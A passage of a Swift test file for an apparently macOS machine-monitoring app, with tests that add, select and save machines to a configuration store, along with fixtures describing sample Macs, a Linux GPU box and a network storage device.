        model.toggleSelection(for: "herd-nas.local")

        #expect(model.selectedReadyCount == 3)
        #expect(!model.selectedMachineIDs.contains("herd-nas.local"))
    }

    @Test
    @MainActor
    func manuallyAddedMachineUsesAnInferredNameAndIsSelected() {
        let storage = InMemoryConfigurationStorage()
        let model = AddMachinesModel(store: testMachineStore(storage), machines: [])

        model.addManualMachine(
            name: "",
            hostname: "render-node.local",
            kind: .linux
        )

        #expect(model.machines.first?.name == "Render Node")
        #expect(model.selectedReadyCount == 1)
    }

    @Test
    @MainActor
    func addMachinesPersistsIntoTheSharedConfigurationStore() throws {
        let storage = InMemoryConfigurationStorage()
        let store = testMachineStore(storage)
        var appliedConfigurations: [MachineConfiguration] = []
        let candidate = try #require(discoveredMachineSamples.first)
        let model = AddMachinesModel(
            store: store,
            machines: [candidate],
            onConfigurationsChanged: { appliedConfigurations = $0 }
        )

        model.saveSelectedMachines()

        #expect(store.contains(hostname: candidate.hostname))
        #expect(appliedConfigurations == store.machines)
    }

    @Test
    @MainActor
    func addMachinesPersistsStorageThatCanFinishLater() {
        let storage = InMemoryConfigurationStorage()
        let store = testMachineStore(storage)
        let model = AddMachinesModel(
            store: store,
            machines: discoveredMachineSamples
        )

        model.saveSelectedMachines()

        #expect(store.contains(hostname: "herd-nas.local"))
        #expect(
            store.machines.first(where: { $0.hostname == "herd-nas.local" })?
                .connection == .smb
        )
    }

    @Test
    @MainActor
    func monitorAcceptsAnArbitrarySavedMachineIdentity() {
        let configuration = MachineConfiguration(
            id: MachineID("render-node.local"),
            name: "Render Node",
            shortName: "Render",
            hostname: "render-node.local",
            hardwareSummary: "Linux workstation",
            platform: .linux,
            connection: .ssh,
            avatar: .oxGPU,
            identityFile: nil,
            serverNames: [],
            supportsGPU: true
        )
        let model = MonitorModel(configurations: [configuration])
        model.selection = .machine(configuration.id)

        #expect(model.machines.map(\.machine) == [configuration.id])
        #expect(model.selectedMachine?.name == "Render Node")
        #expect(model.selectedMachine?.avatar == .oxGPU)
    }

    @Test
    @MainActor
    func configurationStoreRejectsASecondRecordForTheSameMachineName() {
        let storage = InMemoryConfigurationStorage()
        let store = testMachineStore(storage)
        let existing = store.machines[0]
        let duplicate = MachineConfiguration(
            id: MachineID("duplicate.local"),
            name: existing.name,
            shortName: "Duplicate",
            hostname: "duplicate.local",
            hardwareSummary: "Mac · SSH available",
            platform: .macOS,
            connection: .ssh,
            avatar: .chickLaptop,
            identityFile: nil,
            serverNames: [],
            supportsGPU: true
        )

        store.add([duplicate])

        #expect(store.machines == [existing])
    }

    /// The caller holds the `TemporaryDefaults`, so the suite is removed when
    /// that test finishes rather than whenever the test struct happens to be
    /// deallocated — the store writes on the way out, and a removal that races
    /// that write leaves the file behind.
    @MainActor
    private func testMachineStore(
        _ storage: InMemoryConfigurationStorage
    ) -> MachineConfigurationStore {
        MachineConfigurationStore(storage: storage)
    }

    private var discoveredMachineSamples: [DiscoveredMachine] {
        [
            DiscoveredMachine(
                id: "studio-mini.local",
                name: "Studio Mini",
                hostname: "studio-mini.local",
                hardwareSummary: "Mac mini",
                platform: .macOS,
                connection: .ssh,
                avatar: .calfMini,
                readiness: .ready
            ),
            DiscoveredMachine(
                id: "mba-air.local",
                name: "MacBook Air",
                hostname: "mba-air.local",
                hardwareSummary: "Mac laptop",
                platform: .macOS,
                connection: .ssh,
                avatar: .chickLaptop,
                readiness: .ready
            ),
            DiscoveredMachine(
                id: "gpu-box.local",
                name: "Linux GPU Box",
                hostname: "gpu-box.local",
                hardwareSummary: "Linux · SSH available",
                platform: .linux,
                connection: .ssh,
                avatar: .oxGPU,
                readiness: .ready
            ),
            DiscoveredMachine(
                id: "herd-nas.local",
                name: "Herd NAS",
                hostname: "herd-nas.local",
                hardwareSummary: "Network storage",
                platform: .storage,
                connection: .smb,
                avatar: .pigletNAS,
                readiness: .permissionNeeded
            ),
        ]
    }

    private var testMachineConfigurations: [MachineConfiguration] {
        [
            MachineConfiguration(
                id: .macBookAir,
                name: "MacBook Air",
                shortName: "Air",
                hostname: "localhost",
                hardwareSummary: "Mac laptop",
                platform: .macOS,
                connection: .local,
                avatar: .chickLaptop,
                identityFile: nil,
                serverNames: [],
                supportsGPU: true
            ),
            MachineConfiguration(
                id: .macMini,
                name: "Mac mini",
                shortName: "Mini",
                hostname: "mini.local",
                hardwareSummary: "Mac mini",
                platform: .macOS,
                connection: .ssh,
                avatar: .calfMini,
                identityFile: nil,
                serverNames: [],
                supportsGPU: false
            ),
            MachineConfiguration(
                id: .linux,
                name: "Linux",
                shortName: "Linux",
                hostname: "linux.local",
                hardwareSummary: "Linux",
                platform: .linux,
                connection: .ssh,
                avatar: .oxGPU,
                identityFile: nil,
                serverNames: [],
                supportsGPU: true
            ),
            MachineConfiguration(
                id: .synology,
                name: "Storage",
                shortName: "Storage",
                hostname: "storage.local",
                hardwareSummary: "Network storage",
                platform: .storage,
                connection: .smb,
                avatar: .pigletNAS,
                identityFile: nil,
                serverNames: ["storage.local"],
                supportsGPU: false
            ),
        ]
    }

    private func menuBarSnapshot(
        machine: MachineID,
        state: MonitorConnectionState = .live,
        cpuPercent: Double? = nil,
        sustainedCPUPercent: Double? = nil,
        memoryPressure: MemoryPressureLevel? = .normal,
        diskUsedPercent: Double? = 50,
        storageHealth: SynologyHealth? = nil
    ) -> MenuBarMachineSnapshot {
        MenuBarMachineSnapshot(
            machine: machine,
            state: state,
            cpuPercent: cpuPercent,
            memoryPressure: memoryPressure,
            diskUsedPercent: diskUsedPercent,
            storageHealth: storageHealth,
            // These cases are about which condition outranks which, not about
            // how long one has lasted, so a machine that is busy has simply
            // been busy. The cases that separate the two say so explicitly.
            sustainedCPUPercent: sustainedCPUPercent ?? cpuPercent
        )
    }
}
